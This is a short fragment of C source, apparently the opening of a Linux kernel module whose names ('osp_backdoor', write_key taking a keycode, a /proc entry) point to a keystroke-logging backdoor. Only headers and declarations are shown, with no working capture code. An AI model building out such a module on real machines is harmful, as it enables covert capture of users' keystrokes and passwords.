#include <linux/proc_fs.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>


static int proc_device_show(struct seq_file *, void *);
static int proc_device_open(struct inode *, struct file *);
static struct proc_dir_entry * osp_proc_entry;

static char * osp_backdoor_buffer;
static size_t osp_backdoor_buffer_length;
static int osp_backdoor_buffer_maxsize = 3072;

module_param(osp_backdoor_buffer_maxsize, int,  S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);

static int osp_backdoor_init(void);
static void osp_backdoor_write_key(int keycode);
static void osp_backdoor_close(void);
